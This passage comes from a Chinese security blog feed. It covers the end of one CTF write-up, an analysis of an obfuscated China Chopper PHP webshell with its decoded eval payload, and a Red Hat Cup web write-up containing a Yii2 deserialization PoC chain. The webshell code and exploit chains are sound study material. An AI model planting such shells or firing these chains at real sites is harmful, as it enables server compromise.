class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checkMethod-&gt;vaild(<span class="keyword">$this</span>-&gt;param) &amp;&amp; <span class="keyword">$this</span>-&gt;checkMethod-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) </span><br><span class="line">    &#123; <span class="keyword">echo</span> (<span class="string">&quot;You are a good man!&quot;</span>); &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; <span class="keyword">die</span>(<span class="string">&#x27;You are a hacker?&#x27;</span>); &#125;</span><br><span class="line"> &#125; &#125; </span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SayHi</span> </span>&#123; </span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$a</span>; </span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span></span><br><span class="line"><span class="function">     </span>&#123; <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>; array_push(<span class="keyword">$this</span>-&gt;a, <span class="string">&quot;HELLO&quot;</span>); <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a; &#125; </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[flag|file|!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>)) </span><br><span class="line">        &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125; </span><br><span class="line">    &#125; &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>])) &#123; </span><br><span class="line">        unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$v</span> = <span class="keyword">new</span> Verify; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>也就是 <code>y0u_w1ll_s3e_Me.php</code> 的源码</p><p>就反序列化，，亿下，，就可以了，但时间不够了，，晕</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面白i安全小记 | 中国菜刀之连不上的奇怪马</title>
      <link href="//p/2021/fun-cyber-sec-1/"/>
      <url>//p/2021/fun-cyber-sec-1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="本栏目前言"><a href="#本栏目前言" class="headerlink" title="本栏目前言"></a>本栏目前言</h2><p>以前总是和别人一起研究过许多平常没咋注意，但是又非常有意思的小姿势，然后弄完后，但过了许久不用细节可能就忘的差不多了。所以想着开了个小栏目来记录一下一些我平常没咋注意到的、有趣的安全相关内容，可能更新也不是特别的频繁，毕竟不是天天都能遇到这些奇奇怪怪的点的，哈哈。</p><p>不过<strong>栏目的初衷</strong>是：在接触新东西时，遇到不理解或者感觉理解不透彻的，可以给自己或别人解答一波，顺便记录一下，以后可以回来看看，感觉挺有意思。</p><p>就感觉一般我们在学习新东西的时候，都是充满好奇心的，总是好奇这好奇那，这理解起来怪怪的，那不懂，现在有了点基础，自己遇到或别人问到了相关的，以前没注意到的，没能回答上来的，没能很理解的，也可以研究分析一波原理，感觉挺有趣的，所以栏目名称是有趣的安全小记 （</p><h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p>这要和一个在备考 PTE 的同学说起，这是3月份的事情了（之前为了解释清楚写了个文档，一直在语雀扔着）</p><p>这个菜刀连接马长这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Hello&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123; </span><br><span class="line">@preg_replace(<span class="string">&quot;/\[(.*)\]/e&quot;</span>,<span class="string">&#x27;\\1&#x27;</span>,base64_decode(<span class="string">&#x27;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#x27;</span>)); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不过他说连不上，我就奇怪了，你们老师发的马竟然连不上，不应该呀。。</p><p>然后和他激烈的讨论了一波，无果</p><p><img src="/img/fun-cyber-sec-1/image-20210518000346174.png" class="lazyload" data-srcset="/img/fun-cyber-sec-1/image-20210518000346174.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210518000346174"></p><p>回到宿舍分析了一波，首先看马的主要函数 <code>preg_replace</code> </p><ul><li><p>第一个参数表示匹配的模式，这里是匹配 <code>[(.*)]</code> 里的内容，</p></li><li><ul><li><code>/e</code> 表示把第二个参数里的内容当作php代码来解析</li></ul></li><li><p>第三个参数base64解码为 <code>[@eval(base64_decode($_POST[z0]));]</code></p></li><li><p>第二个参数 <code>\\1</code> 在正则表达式里表示匹配的第一个括号中的内容</p></li></ul><p>因此</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@preg_replace(<span class="string">&quot;/\[(.*)\]/e&quot;</span>,<span class="string">&#x27;\\1&#x27;</span>,base64_decode(<span class="string">&#x27;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#x27;</span>)); </span><br></pre></td></tr></table></figure><p>表示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(base64_decode(<span class="variable">$_POST</span>[z0]));</span><br></pre></td></tr></table></figure><p>那为什么密码是 <code>Hello</code> 呢，来观察一下中国菜刀连接的包，</p><p><a href="https://github.com/raddyfiy/caidao-official-version">https://github.com/raddyfiy/caidao-official-version</a></p><ul><li>2016 版本不行，抓包后发现，连接机制不一样…</li><li>2014 版本可以正常连接</li><li>2011版本也可以正常连接，看包也更直观看出，2333</li></ul><p>以 2014版本为例，wireshark 抓包</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1615613197121-749b300c-0582-463f-b961-d1c84e887f22.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1615613197121-749b300c-0582-463f-b961-d1c84e887f22.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>可以看到菜刀，无论你密码是啥，密码参数只是跳板，他会传入一些值，然后上面我们感到疑惑的马 <code>if</code> 不为空即可过，然后 z0 才是真正的马。base解码后为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);@set_magic_quotes_runtime(<span class="number">0</span>);<span class="keyword">echo</span>(<span class="string">&quot;-&gt;|&quot;</span>);;<span class="variable">$D</span>=dirname(<span class="keyword">__FILE__</span>);<span class="variable">$R</span>=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>\t&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$D</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;<span class="keyword">foreach</span>(range(<span class="string">&quot;A&quot;</span>,<span class="string">&quot;Z&quot;</span>) <span class="keyword">as</span> <span class="variable">$L</span>)<span class="keyword">if</span>(is_dir(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;&#125;<span class="variable">$R</span>.=<span class="string">&quot;\t&quot;</span>;<span class="variable">$u</span>=(function_exists(<span class="string">&#x27;posix_getegid&#x27;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">&#x27;&#x27;</span>;<span class="variable">$usr</span>=(<span class="variable">$u</span>)?<span class="variable">$u</span>[<span class="string">&#x27;name&#x27;</span>]:@get_current_user();<span class="variable">$R</span>.=php_uname();<span class="variable">$R</span>.=<span class="string">&quot;(<span class="subst">&#123;$usr&#125;</span>)&quot;</span>;<span class="keyword">print</span> <span class="variable">$R</span>;;<span class="keyword">echo</span>(<span class="string">&quot;|&lt;-&quot;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>平常我们的木马是类似于这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;abc&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们传入的密码是 <code>abc</code> ，其实他是会把 <code>abc</code> 传入的东西 <code>eval</code> 一下变成代码，然后把 <code>z0</code> 值传入，如果成功，就成功啦~</p><p>所以上面的 <code>z0</code> 不用传，就是因为菜刀客户端会自动传。2016版不行，因为新版机制不一样了，2333</p><p>这是 2011 版本菜刀的包，感觉比 2014版更清晰一点~</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1615614006844-e733d96c-b7e7-459b-a3bc-a121755d072a.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1615614006844-e733d96c-b7e7-459b-a3bc-a121755d072a.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>感觉这样一看就捋顺了，顺便收获了人生中语雀的第 1 个赞，泪目</p><p><img src="/img/fun-cyber-sec-1/image-20210518000840645.png" class="lazyload" data-srcset="/img/fun-cyber-sec-1/image-20210518000840645.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210518000840645"></p><p>不过还是有点佩服，给这个马的作者对菜刀的机制研究的应该算是比较深入和透彻了，模板.jpg</p><p>感觉这马还能起到一丢丢的免杀作用，2333，尤其是在 2011年的时候，估计是比较不错的连接马了。</p>]]></content>
      
      
      <categories>
          
          <category> 面白i安全小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面白i安全小记 </tag>
            
            <tag> 中国菜刀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 红帽杯前3Web题 Writeup</title>
      <link href="//p/2021/2021hmb/"/>
      <url>//p/2021/2021hmb/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>今年红帽杯好像难度比往年友好了不少 （</p><h2 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h2><p>目录爆破 &gt; robots.txt &gt; <code>1ndexx.php</code> &gt; 尝试常见信息泄漏得 <code>.1ndexx.php.swp</code> </p><p>访问 <a href="http://eci-2zeg1tmyhxfbomoq43gy.cloudeci1.ichunqiu.com/.1ndexx.php.swp">http://eci-2zeg1tmyhxfbomoq43gy.cloudeci1.ichunqiu.com/.1ndexx.php.swp</a> 得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$link</span> = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background-color: white;</span><br><span class="line">text-align: center;</span><br><span class="line">padding: <span class="number">50</span>px;</span><br><span class="line">font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#logo &#123;</span></span><br><span class="line">margin-bottom: <span class="number">40</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="variable">$link</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(preg_match(&#x27;</span>/system|<span class="keyword">eval</span>|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|<span class="function"><span class="keyword">function</span>|<span class="title">call</span>|\~|\^|\`|<span class="title">flag</span>|<span class="title">cat</span>|<span class="title">tac</span>|<span class="title">more</span>|<span class="title">tail</span>|<span class="title">echo</span>|<span class="title">require</span>|<span class="title">include</span>|<span class="title">proc</span>|<span class="title">open</span>|<span class="title">read</span>|<span class="title">shell</span>|<span class="title">file</span>|<span class="title">put</span>|<span class="title">get</span>|<span class="title">contents</span>|<span class="title">dir</span>|<span class="title">link</span>|<span class="title">dl</span>|<span class="title">var</span>|<span class="title">dump</span>/&#x27;,$<span class="title">a</span>))</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$hack</span>,<span class="variable">$a</span>);</span><br><span class="line">fwrite(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br><span class="line">fclose(<span class="variable">$hack</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写入 <code>phpinfo</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620534353207-1075e97a-4248-4eed-9f29-faae64bf347b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620534353207-1075e97a-4248-4eed-9f29-faae64bf347b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>访问 <code>hack.php</code> 在 <code>phpinfo</code> 页面搜索 <code>flag</code> 关键字即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620534342079-0d99be40-60ee-4732-a268-3e13b442f29f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620534342079-0d99be40-60ee-4732-a268-3e13b442f29f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h2><p>目录爆破得源码 <code>www.zip</code></p><p>看网页源码和源码易知框架为 <code>Yii2</code></p><p>找控制器，</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620555381162-3910cb53-4f5f-4708-9d79-fa2503fc0a34.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620555381162-3910cb53-4f5f-4708-9d79-fa2503fc0a34.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>刚好之前复现了一点 yii2 的反序列化，不过没详细分析</p><p><a href="https://www.yuque.com/u2292949/ugffdq/hfgzlc">https://www.yuque.com/u2292949/ugffdq/hfgzlc</a></p><p>不过知道控制点在</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620555519006-628bd703-ddc5-4f93-84d8-d76fd99577a2.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620555519006-628bd703-ddc5-4f93-84d8-d76fd99577a2.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>即通过 <a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func</a> 调用函数，找个POC，有兴趣可以看看分析过程，<a href="https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&mid=2247485129&idx=1&sn=b27e3fe845daee2fb13bb9f36f53ab40">传送门</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc2</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // 生成<span class="title">poc</span></span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>Yii2</code> 的控制器路由说明（即 <code>index.php?r=site/about&amp;message=</code> 部分）可参考</p><p><a href="https://www.yiiframework.com/doc/guide/2.0/zh-cn/start-hello">https://www.yiiframework.com/doc/guide/2.0/zh-cn/start-hello</a></p><p>构造 EXP</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620555575922-4185668c-4f3c-42b2-a41e-90b1a945423a.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620555575922-4185668c-4f3c-42b2-a41e-90b1a945423a.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>搜了下发现有 <code>disable function</code> 禁用了这些函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,unset,unlink,return</span><br></pre></td></tr></table></figure><p>虽然没有过滤 <code>eval</code> 但 <code>call_user_func</code> 第一个参数只能为回调函数，试了很久，发现 <code>assert</code> 可用，于是构造POC。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span 